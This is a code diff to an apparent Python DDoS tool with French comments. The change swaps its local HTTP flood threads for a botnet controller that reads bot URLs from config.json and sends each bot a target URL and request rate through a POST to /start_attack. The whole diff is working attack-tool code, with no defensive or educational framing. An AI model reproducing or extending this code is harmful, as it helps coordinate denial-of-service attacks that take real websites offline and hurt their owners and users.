@@ -5,6 +5,15 @@ import time
 import sys
 import requests
 from urllib.parse import urlparse
+import json
+
+# Charger les configurations depuis le fichier JSON
+with open('config.json') as config_file:
+    config = json.load(config_file)
+
+SERVER_URL = config['server_url']
+BOT_URLS = config['bot_urls']
+DEFAULT_RATE = config['default_rate']
 
 # Fonction pour afficher un texte avec un effet de simulation de frappe
 def type_effect(text, delay=0.05, color=None):
@@ -62,12 +71,12 @@ def update_script():
     os.system('git pull')
     print("Script updated successfully.")
 
-# Fonction pour démarrer l'attaque
+# Fonction pour démarrer l'attaque sur tous les bots
 def start_attack():
     global stop_attack
 
     target = input("Enter the target URL: ")
-    rate = int(input("Enter the rate (requests per second): "))
+    rate = int(input(f"Enter the rate (requests per second) [default {DEFAULT_RATE}]: ") or DEFAULT_RATE)
 
     parsed_url = urlparse(target)
     if not parsed_url.scheme:
@@ -76,17 +85,18 @@ def start_attack():
 
     port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == 'https' else 80)
 
-    attack_thread = threading.Thread(target=attack_http, args=(target, rate))
-    server_check_thread = threading.Thread(target=check_server, args=(parsed_url.hostname, port))
-
-    attack_thread.start()
-    server_check_thread.start()
-
-    attack_thread.join()
-    server_check_thread.join()
-
-    if not stop_attack:
-        print("DDOS attack failed. Press Control + C and try again.")
+    # Démarrer l'attaque DDoS sur chaque bot
+    for bot_url in BOT_URLS:
+        bot_request_url = f"{bot_url}/start_attack"
+        payload = {'url': target, 'rate': rate}
+        try:
+            response = requests.post(bot_request_url, json=payload)
+            if response.status_code == 200:
+                print(f"Bot {bot_url} received the attack command.")
+            else:
+                print(f"Failed to command bot {bot_url} - Status Code: {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error sending command to bot {bot_url}: {e}")
 
 # Menu principal
 def main():
